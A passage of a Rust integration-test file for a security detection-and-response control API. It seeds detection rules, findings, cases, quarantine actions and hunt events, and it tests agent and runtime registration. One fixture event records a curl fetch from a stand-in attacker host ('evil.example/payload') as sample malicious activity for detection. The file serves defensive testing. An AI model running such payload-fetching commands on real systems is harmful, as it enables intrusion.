            "source_text": "schema: clawdstrike.hunt.correlation.v1\nname: operator-flow-rule\nseverity: high\ndescription: e2e\nwindow: 30s\nconditions:\n  - source: tetragon\n    target_pattern: curl\n    bind: suspicious_exec\noutput:\n  title: Suspicious operator flow\n  evidence:\n    - suspicious_exec\n",
            "tags": ["operator-flow", "integration"],
            "enabled": true
        })),
    )
    .await;
    assert_eq!(create_rule_resp.0, StatusCode::OK);
    let rule_id = Uuid::parse_str(create_rule_resp.1["id"].as_str().expect("rule id"))
        .expect("parse rule id");

    let detection_service = AlerterService::new(harness.db.clone());
    let finding = detection_service
        .create_detection_finding_for_test(
            harness.tenant_id,
            rule_id,
            "operator-flow-rule",
            "native_correlation",
            "high",
            "Suspicious operator flow",
            "curl execution triggered an operator response workflow",
            &[detection_raw_ref.as_str()],
        )
        .await
        .expect("create e2e finding");

    sqlx::query::query(
        r#"UPDATE detection_findings
           SET principal_id = $3,
               session_id = $4,
               grant_id = $5
           WHERE tenant_id = $1
             AND id = $2"#,
    )
    .bind(harness.tenant_id)
    .bind(finding.id)
    .bind(principal_id)
    .bind(&session_id)
    .bind(grant_id)
    .execute(&harness.db)
    .await
    .expect("link finding to operator principal");

    let case_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/cases".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "title": "Operator flow investigation",
            "summary": "Investigate suspicious operator workflow activity",
            "severity": "high",
            "principalIds": [principal_id.to_string()],
            "detectionIds": [finding.id.to_string()],
            "tags": ["operator-flow"]
        })),
    )
    .await;
    assert_eq!(case_resp.0, StatusCode::OK);
    let case_id = case_resp.1["id"].as_str().expect("case id").to_string();

    let action_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/response-actions".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "actionType": "request_policy_reload",
            "target": {
                "kind": "endpoint",
                "id": &agent_id
            },
            "reason": "Investigate suspicious operator flow",
            "caseId": &case_id,
            "sourceDetectionId": finding.id.to_string(),
            "requireAcknowledgement": false,
            "payload": {
                "reloadMode": "full"
            }
        })),
    )
    .await;
    assert_eq!(action_resp.0, StatusCode::OK);
    assert_eq!(action_resp.1["status"], "queued");
    let action_id =
        Uuid::parse_str(action_resp.1["id"].as_str().expect("action id")).expect("parse action id");

    OperatorFlowFixture {
        agent_id,
        session_id,
        detection_raw_ref,
        response_raw_ref,
        principal_id,
        response_subject,
        legacy_response_subject,
        grant_id,
        finding_id: finding.id,
        case_id,
        action_id,
    }
}

async fn seed_console_read_model_fixture(harness: &Harness) -> ConsoleFixture {
    let principal_id = Uuid::new_v4();
    let secondary_principal_id = Uuid::new_v4();
    let swarm_id = Uuid::new_v4();
    let project_id = Uuid::new_v4();
    let capability_group_id = Uuid::new_v4();
    let rule_id = Uuid::new_v4();
    let detection_id = Uuid::new_v4();
    let action_id = Uuid::new_v4();
    let grant_id = Uuid::new_v4();

    sqlx::query::query(
        r#"INSERT INTO principals (
               id,
               tenant_id,
               principal_type,
               stable_ref,
               display_name,
               trust_level,
               lifecycle_state,
               liveness_state,
               public_key,
               metadata
           ) VALUES (
               $1,
               $2,
               'endpoint_agent',
               'endpoint-1',
               'Planner MacBook',
               'high',
               'active',
               'active',
               'pk-primary',
               $3
           )"#,
    )
    .bind(principal_id)
    .bind(harness.tenant_id)
    .bind(serde_json::json!({ "platform": "macos" }))
    .execute(&harness.db)
    .await
    .expect("seed console principal");

    sqlx::query::query(
        r#"INSERT INTO principals (
               id,
               tenant_id,
               principal_type,
               stable_ref,
               display_name,
               trust_level,
               lifecycle_state,
               liveness_state,
               metadata
           ) VALUES (
               $1,
               $2,
               'runtime_agent',
               'runtime-1',
               'Runtime Sidecar',
               'medium',
               'quarantined',
               'stale',
               '{}'::jsonb
           )"#,
    )
    .bind(secondary_principal_id)
    .bind(harness.tenant_id)
    .execute(&harness.db)
    .await
    .expect("seed secondary principal");

    let agent_row = sqlx::query::query(
        r#"INSERT INTO agents (
               tenant_id,
               agent_id,
               name,
               public_key,
               role,
               trust_level,
               status,
               last_heartbeat_at,
               metadata,
               principal_id
           ) VALUES (
               $1,
               'endpoint-1',
               'Planner MacBook',
               'pk-primary',
               'coder',
               'high',
               'active',
               '2026-03-06T12:00:00Z'::timestamptz,
               $2,
               $3
           )
           RETURNING id"#,
    )
    .bind(harness.tenant_id)
    .bind(serde_json::json!({ "posture": "nominal", "daemon": "healthy" }))
    .bind(principal_id)
    .fetch_one(&harness.db)
    .await
    .expect("seed endpoint agent");
    let endpoint_agent_row_id: Uuid = agent_row.try_get("id").expect("endpoint agent row id");

    sqlx::query::query(
        r#"INSERT INTO swarms (id, tenant_id, slug, name, kind)
           VALUES ($1, $2, 'fleet-east', 'Fleet East', 'fleet')"#,
    )
    .bind(swarm_id)
    .bind(harness.tenant_id)
    .execute(&harness.db)
    .await
    .expect("seed swarm");

    sqlx::query::query(
        r#"INSERT INTO projects (id, tenant_id, swarm_id, slug, name, environment)
           VALUES ($1, $2, $3, 'payments-prod', 'Payments Prod', 'prod')"#,
    )
    .bind(project_id)
    .bind(harness.tenant_id)
    .bind(swarm_id)
    .execute(&harness.db)
    .await
    .expect("seed project");

    sqlx::query::query(
        r#"INSERT INTO capability_groups (id, tenant_id, name, capabilities)
           VALUES ($1, $2, 'Responders', '["contain"]'::jsonb)"#,
    )
    .bind(capability_group_id)
    .bind(harness.tenant_id)
    .execute(&harness.db)
    .await
    .expect("seed capability group");

    for (target_kind, target_id, role) in [
        ("swarm", swarm_id, Some("member")),
        ("project", project_id, Some("service")),
        ("capability_group", capability_group_id, Some("responder")),
    ] {
        sqlx::query::query(
            r#"INSERT INTO principal_memberships (
                   tenant_id,
                   principal_id,
                   target_kind,
                   target_id,
                   role
               ) VALUES ($1, $2, $3, $4, $5)"#,
        )
        .bind(harness.tenant_id)
        .bind(principal_id)
        .bind(target_kind)
        .bind(target_id)
        .bind(role)
        .execute(&harness.db)
        .await
        .expect("seed principal membership");
    }

    policy_distribution::upsert_active_policy(
        &harness.db,
        harness.tenant_id,
        "mode: tenant-base\nregion: west\nkeep: true\n",
        Some("console-read-model"),
    )
    .await
    .expect("seed active policy");

    for (target_kind, target_id, priority, policy_yaml, checksum) in [
        (
            "tenant",
            None,
            10_i32,
            "region: east\ncontrols:\n  baseline: true\n",
            Some("tenant-layer"),
        ),
        (
            "swarm",
            Some(swarm_id),
            20_i32,
            "mode: swarm\n",
            Some("swarm-layer"),
        ),
        (
            "principal",
            Some(principal_id),
            30_i32,
            "final: true\n",
            Some("principal-layer"),
        ),
    ] {
        sqlx::query::query(
            r#"INSERT INTO policy_attachments (
                   tenant_id,
                   target_kind,
                   target_id,
                   priority,
                   policy_yaml,
                   checksum_sha256,
                   created_by
               ) VALUES ($1, $2, $3, $4, $5, $6, 'integration')"#,
        )
        .bind(harness.tenant_id)
        .bind(target_kind)
        .bind(target_id)
        .bind(priority)
        .bind(policy_yaml)
        .bind(checksum)
        .execute(&harness.db)
        .await
        .expect("seed policy attachment");
    }

    sqlx::query::query(
        r#"INSERT INTO detection_rules (
               id,
               tenant_id,
               name,
               description,
               severity,
               source_format,
               engine_kind,
               execution_mode,
               created_by,
               source_text
           ) VALUES (
               $1,
               $2,
               'console-rule',
               'integration console rule',
               'high',
               'native_correlation',
               'correlation',
               'streaming',
               'integration',
               'rule: console'
           )"#,
    )
    .bind(rule_id)
    .bind(harness.tenant_id)
    .execute(&harness.db)
    .await
    .expect("seed detection rule");

    sqlx::query::query(
        r#"INSERT INTO detection_findings (
               id,
               tenant_id,
               rule_id,
               rule_name,
               source_format,
               severity,
               status,
               title,
               summary,
               principal_id,
               session_id,
               grant_id,
               response_action_ids,
               first_seen_at,
               last_seen_at,
               metadata,
               created_at
           ) VALUES (
               $1,
               $2,
               $3,
               'console-rule',
               'native_correlation',
               'high',
               'open',
               'Suspicious curl',
               'Detected suspicious curl activity',
               $4,
               'session-1',
               $5,
               '[]'::jsonb,
               '2026-03-06T12:00:00Z'::timestamptz,
               '2026-03-06T12:05:00Z'::timestamptz,
               '{}'::jsonb,
               '2026-03-06T12:05:00Z'::timestamptz
           )"#,
    )
    .bind(detection_id)
    .bind(harness.tenant_id)
    .bind(rule_id)
    .bind(principal_id)
    .bind(grant_id)
    .execute(&harness.db)
    .await
    .expect("seed detection finding");

    sqlx::query::query(
        r#"INSERT INTO response_actions (
               id,
               tenant_id,
               action_type,
               target_kind,
               target_id,
               requested_by_type,
               requested_by_id,
               requested_at,
               reason,
               source_detection_id,
               payload,
               status
           ) VALUES (
               $1,
               $2,
               'quarantine_principal',
               'principal',
               $3,
               'user',
               'operator@example.com',
               '2026-03-06T12:06:00Z'::timestamptz,
               'Contain quickly',
               $4,
               '{}'::jsonb,
               'queued'
           )"#,
    )
    .bind(action_id)
    .bind(harness.tenant_id)
    .bind(principal_id.to_string())
    .bind(detection_id)
    .execute(&harness.db)
    .await
    .expect("seed response action");

    sqlx::query::query(
        r#"INSERT INTO fleet_grants (
               id,
               tenant_id,
               issuer_principal_id,
               subject_principal_id,
               audience,
               token_jti,
               delegation_depth,
               lineage_chain,
               capabilities,
               capability_ceiling,
               context,
               issued_at,
               expires_at,
               status
           ) VALUES (
               $1,
               $2,
               $3,
               $4,
               'control-console',
               'console-grant-1',
               0,
               '[]'::jsonb,
               '["quarantine_principal"]'::jsonb,
               '["quarantine_principal"]'::jsonb,
               '{}'::jsonb,
               '2026-03-06T11:55:00Z'::timestamptz,
               '2026-03-06T13:00:00Z'::timestamptz,
               'active'
           )"#,
    )
    .bind(grant_id)
    .bind(harness.tenant_id)
    .bind(secondary_principal_id.to_string())
    .bind("endpoint-1")
    .execute(&harness.db)
    .await
    .expect("seed fleet grant");

    let principal_node_id = format!("principal:{principal_id}");
    let grant_node_id = format!("grant:{grant_id}");
    let action_node_id = format!("response_action:{action_id}");

    for (node_id, kind, label, state) in [
        (
            principal_node_id.as_str(),
            "principal",
            "Planner MacBook",
            Some("active"),
        ),
        (
            grant_node_id.as_str(),
            "grant",
            "Fleet quarantine grant",
            Some("active"),
        ),
        (
            action_node_id.as_str(),
            "response_action",
            "Quarantine principal",
            Some("queued"),
        ),
    ] {
        sqlx::query::query(
            r#"INSERT INTO delegation_graph_nodes (
                   tenant_id,
                   id,
                   kind,
                   label,
                   state,
                   metadata
               ) VALUES ($1, $2, $3, $4, $5, '{}'::jsonb)"#,
        )
        .bind(harness.tenant_id)
        .bind(node_id)
        .bind(kind)
        .bind(label)
        .bind(state)
        .execute(&harness.db)
        .await
        .expect("seed graph node");
    }

    for (from_node_id, to_node_id, kind) in [
        (
            principal_node_id.as_str(),
            grant_node_id.as_str(),
            "received_grant",
        ),
        (
            grant_node_id.as_str(),
            action_node_id.as_str(),
            "triggered_response_action",
        ),
    ] {
        sqlx::query::query(
            r#"INSERT INTO delegation_graph_edges (
                   tenant_id,
                   from_node_id,
                   to_node_id,
                   kind,
                   metadata
               ) VALUES ($1, $2, $3, $4, '{}'::jsonb)"#,
        )
        .bind(harness.tenant_id)
        .bind(from_node_id)
        .bind(to_node_id)
        .bind(kind)
        .execute(&harness.db)
        .await
        .expect("seed graph edge");
    }

    for (
        event_id,
        source,
        kind,
        timestamp,
        ingested_at,
        verdict,
        summary,
        action_type,
        response_action_id,
        detection_ids,
        target_kind,
        target_id,
        target_name,
        attributes,
    ) in [
        (
            "console-hunt-1",
            "tetragon",
            "process_exec",
            "2026-03-06T12:00:00Z",
            "2026-03-06T12:00:01Z",
            "allow",
            "process_exec /usr/bin/curl https://evil.example/payload",
            Some("process"),
            None,
            Vec::<String>::new(),
            Some("process"),
            Some("1001".to_string()),
            Some("curl".to_string()),
            serde_json::json!({
                "process": "/usr/bin/curl",
                "url": "https://evil.example/payload",
                "namespace": "default",
                "pod": "planner-1"
            }),
        ),
        (
            "console-hunt-2",
            "response",
            "response_action_updated",
            "2026-03-06T12:05:00Z",
            "2026-03-06T12:05:01Z",
            "deny",
            "response action queued for Planner MacBook",
            Some("quarantine"),
            Some(action_id.to_string()),
            vec![detection_id.to_string()],
            Some("principal"),
            Some(principal_id.to_string()),
            Some("Planner MacBook".to_string()),
            serde_json::json!({
                "status": "queued",
                "operator": "operator@example.com"
            }),
        ),
    ] {
        sqlx::query::query(
            r#"INSERT INTO hunt_events (
                   event_id,
                   tenant_id,
                   source,
                   kind,
                   timestamp,
                   ingested_at,
                   verdict,
                   severity,
                   summary,
                   action_type,
                   session_id,
                   endpoint_agent_id,
                   runtime_agent_id,
                   principal_id,
                   grant_id,
                   response_action_id,
                   detection_ids,
                   target_kind,
                   target_id,
                   target_name,
                   envelope_hash,
                   issuer,
                   schema_name,
                   signature_valid,
                   raw_ref,
                   attributes
               ) VALUES (
                   $1,
                   $2,
                   $3,
                   $4,
                   $5::timestamptz,
                   $6::timestamptz,
                   $7,
                   'medium',
                   $8,
                   $9,
                   'session-1',
                   'endpoint-1',
                   'runtime-1',
                   $10,
                   $11,
                   $12,
                   $13,
                   $14,
                   $15,
                   $16,
                   $17,
                   'spiffe://tenant/acme-int',
                   'clawdstrike.sdr.fact.console.v1',
                   true,
                   $18,
                   $19
               )"#,
        )
        .bind(event_id)
        .bind(harness.tenant_id)
        .bind(source)
        .bind(kind)
        .bind(timestamp)
        .bind(ingested_at)
        .bind(verdict)
        .bind(summary)
        .bind(action_type)
        .bind(principal_id.to_string())
        .bind(grant_id.to_string())
        .bind(response_action_id)
        .bind(detection_ids)
        .bind(target_kind)
        .bind(target_id)
        .bind(target_name)
        .bind(format!("hash-{event_id}"))
        .bind(format!("hunt-envelope:{event_id}"))
        .bind(attributes)
        .execute(&harness.db)
        .await
        .expect("seed hunt event");
    }

    let noise_tenant_id = seed_tenant(&harness.db, "console-noise", "Console Noise").await;
    let noise_principal_id = Uuid::new_v4();

    sqlx::query::query(
        r#"INSERT INTO principals (
               id,
               tenant_id,
               principal_type,
               stable_ref,
               display_name,
               trust_level,
               lifecycle_state,
               liveness_state,
               metadata
           ) VALUES (
               $1,
               $2,
               'endpoint_agent',
               'noise-endpoint',
               'Noise Endpoint',
               'medium',
               'active',
               'active',
               '{}'::jsonb
           )"#,
    )
    .bind(noise_principal_id)
    .bind(noise_tenant_id)
    .execute(&harness.db)
    .await
    .expect("seed noise principal");

    sqlx::query::query(
        r#"INSERT INTO hunt_events (
               event_id,
               tenant_id,
               source,
               kind,
               timestamp,
               ingested_at,
               verdict,
               severity,
               summary,
               principal_id,
               raw_ref,
               attributes
           ) VALUES (
               'console-noise-1',
               $1,
               'tetragon',
               'process_exec',
               '2026-03-06T12:10:00Z'::timestamptz,
               '2026-03-06T12:10:01Z'::timestamptz,
               'allow',
               'low',
               'noise event',
               $2,
               'hunt-envelope:console-noise-1',
               '{}'::jsonb
           )"#,
    )
    .bind(noise_tenant_id)
    .bind(noise_principal_id.to_string())
    .execute(&harness.db)
    .await
    .expect("seed noise hunt event");

    ConsoleFixture {
        principal_id,
        principal_stable_ref: "endpoint-1".to_string(),
        endpoint_agent_id: "endpoint-1".to_string(),
        endpoint_agent_row_id,
        grant_id,
        action_id,
    }
}

async fn request_json(
    app: &axum::Router,
    method: Method,
    path: String,
    api_key: Option<&str>,
    json_body: Option<Value>,
) -> (StatusCode, Value) {
    let body = match &json_body {
        Some(value) => Body::from(serde_json::to_vec(value).expect("serialize body")),
        None => Body::empty(),
    };
    let mut builder = Request::builder().method(method).uri(path);
    if json_body.is_some() {
        builder = builder.header("content-type", "application/json");
    }
    if let Some(key) = api_key {
        builder = builder.header("x-api-key", key);
    }
    let request = builder.body(body).expect("build request");

    let response = app.clone().oneshot(request).await.expect("router request");
    let status = response.status();
    let bytes = to_bytes(response.into_body(), 2 * 1024 * 1024)
        .await
        .expect("read response body");
    let body = if bytes.is_empty() {
        serde_json::json!({})
    } else {
        serde_json::from_slice::<Value>(&bytes).expect("response json")
    };
    (status, body)
}

async fn request_json_bearer(
    app: &axum::Router,
    method: Method,
    path: String,
    api_key: Option<&str>,
    json_body: Option<Value>,
) -> (StatusCode, Value) {
    let body = match &json_body {
        Some(value) => Body::from(serde_json::to_vec(value).expect("serialize body")),
        None => Body::empty(),
    };
    let mut builder = Request::builder().method(method).uri(path);
    if json_body.is_some() {
        builder = builder.header("content-type", "application/json");
    }
    if let Some(key) = api_key {
        builder = builder.header("authorization", format!("Bearer {key}"));
    }
    let request = builder.body(body).expect("build request");

    let response = app.clone().oneshot(request).await.expect("router request");
    let status = response.status();
    let bytes = to_bytes(response.into_body(), 2 * 1024 * 1024)
        .await
        .expect("read response body");
    let body = if bytes.is_empty() {
        serde_json::json!({})
    } else {
        serde_json::from_slice::<Value>(&bytes).expect("response json")
    };
    (status, body)
}

async fn request_json_dual_auth(
    app: &axum::Router,
    method: Method,
    path: String,
    bearer: Option<&str>,
    api_key: Option<&str>,
    json_body: Option<Value>,
) -> (StatusCode, Value) {
    let body = match &json_body {
        Some(value) => Body::from(serde_json::to_vec(value).expect("serialize body")),
        None => Body::empty(),
    };
    let mut builder = Request::builder().method(method).uri(path);
    if json_body.is_some() {
        builder = builder.header("content-type", "application/json");
    }
    if let Some(token) = bearer {
        builder = builder.header("authorization", format!("Bearer {token}"));
    }
    if let Some(key) = api_key {
        builder = builder.header("x-api-key", key);
    }
    let request = builder.body(body).expect("build request");

    let response = app.clone().oneshot(request).await.expect("router request");
    let status = response.status();
    let bytes = to_bytes(response.into_body(), 2 * 1024 * 1024)
        .await
        .expect("read response body");
    let body = if bytes.is_empty() {
        serde_json::json!({})
    } else {
        serde_json::from_slice::<Value>(&bytes).expect("response json")
    };
    (status, body)
}

fn docker_available() -> bool {
    Command::new("docker")
        .args(["info"])
        .output()
        .map(|output| output.status.success())
        .unwrap_or(false)
}

fn zip_entry_text(bytes: &[u8], path: &str) -> String {
    let reader = Cursor::new(bytes);
    let mut archive = zip::ZipArchive::new(reader).expect("open evidence bundle zip");
    let mut entry = archive.by_name(path).expect("evidence bundle zip entry");
    let mut text = String::new();
    entry
        .read_to_string(&mut text)
        .expect("read evidence bundle zip entry");
    text
}

fn is_retryable_docker_run_error(stderr: &str) -> bool {
    let normalized = stderr.to_lowercase();
    [
        "bad gateway",
        "service unavailable",
        "internal server error",
        "client.timeout exceeded while awaiting headers",
        "tls handshake timeout",
        "connection reset by peer",
        "unexpected eof",
        "i/o timeout",
        "temporary failure in name resolution",
        "toomanyrequests",
    ]
    .iter()
    .any(|needle| normalized.contains(needle))
}

fn run_container(args: &[&str]) -> DockerContainer {
    const MAX_ATTEMPTS: usize = 4;

    for attempt in 1..=MAX_ATTEMPTS {
        let output = Command::new("docker")
            .args(args)
            .output()
            .expect("docker run should execute");
        if output.status.success() {
            let id = String::from_utf8(output.stdout)
                .expect("container id utf8")
                .trim()
                .to_string();
            return DockerContainer { id };
        }

        let stderr = String::from_utf8_lossy(&output.stderr).into_owned();
        if attempt < MAX_ATTEMPTS && is_retryable_docker_run_error(&stderr) {
            eprintln!(
                "docker run attempt {attempt}/{MAX_ATTEMPTS} failed with a transient registry/network error; retrying: {stderr}"
            );
            std::thread::sleep(Duration::from_millis(750 * attempt as u64));
            continue;
        }

        panic!("docker run failed after {attempt} attempt(s): {stderr}");
    }

    unreachable!("docker run should return or panic");
}

#[test]
fn retryable_docker_run_error_matches_transient_registry_failures() {
    assert!(is_retryable_docker_run_error(
        "docker: Error response from daemon: Head \"https://registry-1.docker.io/v2/library/postgres/manifests/16-alpine\": received unexpected HTTP status: 502 Bad Gateway"
    ));
    assert!(is_retryable_docker_run_error(
        "docker: Error response from daemon: Head \"https://registry-1.docker.io/v2/library/nats/manifests/2.10-alpine\": received unexpected HTTP status: 500 Internal Server Error"
    ));
    assert!(is_retryable_docker_run_error(
        "docker: Error response from daemon: Head \"https://registry-1.docker.io/v2/library/nats/manifests/2.10-alpine\": net/http: request canceled (Client.Timeout exceeded while awaiting headers)"
    ));
}

#[test]
fn retryable_docker_run_error_ignores_permanent_container_failures() {
    assert!(!is_retryable_docker_run_error(
        "docker: Error response from daemon: manifest for does-not-exist:latest not found"
    ));
}

fn container_host_port(container: &DockerContainer, container_port: u16) -> u16 {
    for _ in 0..20 {
        if let Some(port) = try_container_host_port(container, container_port) {
            return port;
        }
        std::thread::sleep(Duration::from_millis(100));
    }

    panic!(
        "timed out resolving host port for container {} port {}",
        container.id, container_port
    );
}

fn try_container_host_port(container: &DockerContainer, container_port: u16) -> Option<u16> {
    let output = Command::new("docker")
        .args(["port", &container.id, &format!("{container_port}/tcp")])
        .output()
        .expect("docker port should execute");
    assert!(
        output.status.success(),
        "docker port failed for {}: {}",
        container.id,
        String::from_utf8_lossy(&output.stderr)
    );

    let stdout = String::from_utf8(output.stdout).expect("docker port output utf8");
    parse_docker_host_port(&stdout)
}

fn parse_docker_host_port(output: &str) -> Option<u16> {
    output
        .lines()
        .find_map(|line| line.rsplit_once(':')?.1.trim().parse::<u16>().ok())
}

async fn wait_for_postgres(database_url: &str) {
    for _ in 0..60 {
        match create_pool(database_url).await {
            Ok(pool) => {
                let _ = pool.close().await;
                return;
            }
            Err(_) => tokio::time::sleep(Duration::from_millis(500)).await,
        }
    }
    panic!("timed out waiting for postgres");
}

async fn wait_for_nats(nats_url: &str) {
    for _ in 0..60 {
        match async_nats::connect(nats_url).await {
            Ok(client) => {
                let _ = client.flush().await;
                return;
            }
            Err(_) => tokio::time::sleep(Duration::from_millis(300)).await,
        }
    }
    panic!("timed out waiting for nats");
}

// ---------------------------------------------------------------------------
// Runtime registration integration tests
// ---------------------------------------------------------------------------

/// Helper: register an endpoint agent via POST /api/v1/agents and return its
/// row UUID (the `id` field in the response).
async fn register_endpoint_agent(
    app: &axum::Router,
    api_key: &str,
    agent_id: &str,
    name: &str,
) -> Uuid {
    let keypair = hush_core::Keypair::generate();
    let resp = request_json(
        app,
        Method::POST,
        "/api/v1/agents".to_string(),
        Some(api_key),
        Some(serde_json::json!({
            "agent_id": agent_id,
            "name": name,
            "public_key": keypair.public_key().to_hex(),
            "role": "coder",
            "trust_level": "high"
        })),
    )
    .await;
    assert_eq!(resp.0, StatusCode::OK, "register_endpoint_agent failed");
    Uuid::parse_str(resp.1["id"].as_str().expect("agent id")).expect("parse agent uuid")
}

/// Helper: register a runtime under an endpoint agent via POST
/// /api/v1/agents/{id}/runtimes and return the parsed response body.
async fn register_runtime(
    app: &axum::Router,
    api_key: &str,
    agent_uuid: Uuid,
    runtime_name: &str,
) -> (StatusCode, Value) {
    let keypair = hush_core::Keypair::generate();
    request_json(
        app,
        Method::POST,
        format!("/api/v1/agents/{agent_uuid}/runtimes"),
        Some(api_key),
        Some(serde_json::json!({
            "name": runtime_name,
            "public_key": keypair.public_key().to_hex()
        })),
    )
    .await
}

async fn insert_endpoint_hierarchy_node(
    db: &PgPool,
    tenant_id: Uuid,
    node_id: Uuid,
    name: &str,
    external_id: Option<&str>,
) {
    sqlx::query::query(
        r#"INSERT INTO hierarchy_nodes (
               id, tenant_id, name, node_type, external_id, metadata
           )
           VALUES ($1, $2, $3, 'endpoint', $4, '{}'::jsonb)"#,
    )
    .bind(node_id)
    .bind(tenant_id)
    .bind(name)
    .bind(external_id)
    .execute(db)
    .await
    .expect("insert endpoint hierarchy node");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn register_agent_rollback_clears_endpoint_hierarchy_link_on_provision_failure() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let endpoint_node_id = Uuid::new_v4();
    insert_endpoint_hierarchy_node(
        &harness.db,
        harness.tenant_id,
        endpoint_node_id,
        "Rollback Endpoint",
        None,
    )
    .await;

    let failing_provisioner = TenantProvisioner::new(
        harness.db.clone(),
        harness.nats_url.clone(),
        "external",
        Some("http://127.0.0.1:9".to_string()),
        None,
        false,
    )
    .expect("failing provisioner should construct");
    let failing_state = AppState {
        config: Config {
            listen_addr: "127.0.0.1:0".parse().expect("listen addr"),
            cors_allowed_origins: Vec::new(),
            database_url: "postgres://unused".to_string(),
            nats_url: harness.nats_url.clone(),
            agent_nats_url: harness.nats_url.clone(),
            nats_provisioning_mode: "external".to_string(),
            nats_provisioner_base_url: Some("http://127.0.0.1:9".to_string()),
            nats_provisioner_api_token: None,
            nats_allow_insecure_mock_provisioner: false,
            jwt_secret: "jwt-secret".to_string(),
            jwt_issuer: "clawdstrike-control-api".to_string(),
            jwt_audience: "clawdstrike-control-api".to_string(),
            stripe_secret_key: "stripe-key".to_string(),
            stripe_webhook_secret: "stripe-webhook".to_string(),
            approval_signing_enabled: true,
            approval_signing_keypair_path: None,
            approval_resolution_outbox_enabled: true,
            approval_resolution_outbox_poll_interval_secs: 5,
            audit_consumer_enabled: false,
            audit_subject_filter: "tenant-*.>".to_string(),
            audit_stream_name: "audit".to_string(),
            audit_consumer_name: "audit-consumer".to_string(),
            approval_consumer_enabled: false,
            approval_subject_filter: "tenant-*.>".to_string(),
            approval_stream_name: "approval".to_string(),
            approval_consumer_name: "approval-consumer".to_string(),
            heartbeat_consumer_enabled: false,
            heartbeat_subject_filter: "tenant-*.>".to_string(),
            heartbeat_stream_name: "heartbeat".to_string(),
            heartbeat_consumer_name: "heartbeat-consumer".to_string(),
            hunt_event_consumer_enabled: false,
            hunt_event_subject_filter: "tenant-*.>".to_string(),
            hunt_event_stream_name: "hunt-events".to_string(),
            hunt_event_consumer_name: "hunt-event-consumer".to_string(),
            stale_detector_enabled: false,
            stale_check_interval_secs: 60,
            stale_threshold_secs: 120,
            dead_threshold_secs: 300,
        },
        db: harness.db.clone(),
        nats: harness.nats.clone(),
        provisioner: failing_provisioner,
        metering: MeteringService::new(harness.db.clone()),
        alerter: AlerterService::new(harness.db.clone()),
        retention: RetentionService::new(harness.db.clone()),
        signing_keypair: Some(harness.signing_keypair.clone()),
        receipt_store: crate::routes::receipts::ReceiptStore::new(),
        catalog: crate::services::catalog::CatalogStore::new(),
    };
    let app = routes::router(failing_state);

    let keypair = hush_core::Keypair::generate();
    let create_resp = request_json(
        &app,
        Method::POST,
        "/api/v1/agents".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "agent_id": "rollback-endpoint",
            "name": "Rollback Endpoint",
            "public_key": keypair.public_key().to_hex(),
            "role": "coder",
            "trust_level": "high"
        })),
    )
    .await;
    assert_eq!(create_resp.0, StatusCode::INTERNAL_SERVER_ERROR);

    let agent_row = sqlx::query::query(
        r#"SELECT id
           FROM agents
           WHERE tenant_id = $1
             AND agent_id = 'rollback-endpoint'"#,
    )
    .bind(harness.tenant_id)
    .fetch_optional(&harness.db)
    .await
    .expect("agent lookup should succeed");
    assert!(agent_row.is_none(), "agent row should be rolled back");

    let principal_row = sqlx::query::query(
        r#"SELECT id
           FROM principals
           WHERE tenant_id = $1
             AND principal_type = 'endpoint_agent'
             AND stable_ref = 'rollback-endpoint'"#,
    )
    .bind(harness.tenant_id)
    .fetch_optional(&harness.db)
    .await
    .expect("principal lookup should succeed");
    assert!(
        principal_row.is_none(),
        "principal row should be rolled back"
    );

    let hierarchy_row = sqlx::query::query(
        r#"SELECT external_id
           FROM hierarchy_nodes
           WHERE tenant_id = $1
             AND id = $2"#,
    )
    .bind(harness.tenant_id)
    .bind(endpoint_node_id)
    .fetch_one(&harness.db)
    .await
    .expect("fetch hierarchy node");
    let external_id: Option<String> = hierarchy_row.try_get("external_id").expect("external_id");
    assert_eq!(external_id, None);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn register_runtime_creates_hierarchy_node_and_principal() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let endpoint_node_id = Uuid::new_v4();
    insert_endpoint_hierarchy_node(
        &harness.db,
        harness.tenant_id,
        endpoint_node_id,
        "RT Endpoint 1",
        None,
    )
    .await;

    // Register an endpoint agent first.
    let agent_uuid =
        register_endpoint_agent(&harness.app, &harness.api_key, "rt-ep-1", "RT Endpoint 1").await;

    // Register a runtime under that endpoint.
    let (status, body) = register_runtime(
        &harness.app,
        &harness.api_key,
        agent_uuid,
        "claude-code-main",
    )
    .await;
    assert_eq!(status, StatusCode::OK);

    let runtime_principal_id = Uuid::parse_str(
        body["runtime_principal_id"]
            .as_str()
            .expect("runtime_principal_id missing"),
    )
    .expect("parse runtime principal uuid");
    let endpoint_principal_id = Uuid::parse_str(
        body["endpoint_principal_id"]
            .as_str()
            .expect("endpoint_principal_id missing"),
    )
    .expect("parse endpoint principal uuid");
    let hierarchy_node_id = Uuid::parse_str(
        body["hierarchy_node_id"]
            .as_str()
            .expect("hierarchy_node_id missing"),
    )
    .expect("parse hierarchy node uuid");

    assert_ne!(runtime_principal_id, Uuid::nil());
    assert_ne!(endpoint_principal_id, Uuid::nil());

    let endpoint_hierarchy_row = sqlx::query::query(
        r#"SELECT external_id
           FROM hierarchy_nodes
           WHERE tenant_id = $1
             AND id = $2"#,
    )
    .bind(harness.tenant_id)
    .bind(endpoint_node_id)
    .fetch_one(&harness.db)
    .await
    .expect("fetch endpoint hierarchy node");
    let endpoint_external_id: Option<String> = endpoint_hierarchy_row
        .try_get("external_id")
        .expect("external_id");
    assert_eq!(endpoint_external_id.as_deref(), Some("rt-ep-1"));

    // Verify the principal was created with the correct type and stable_ref.
    let principal_row = sqlx::query::query(
        r#"SELECT principal_type, stable_ref, display_name, trust_level, lifecycle_state
           FROM principals
           WHERE tenant_id = $1 AND id = $2"#,
    )
    .bind(harness.tenant_id)
    .bind(runtime_principal_id)
    .fetch_one(&harness.db)
    .await
    .expect("fetch runtime principal");

    let principal_type: String = principal_row
        .try_get("principal_type")
        .expect("principal_type");
    let stable_ref: String = principal_row.try_get("stable_ref").expect("stable_ref");
    let display_name: String = principal_row.try_get("display_name").expect("display_name");
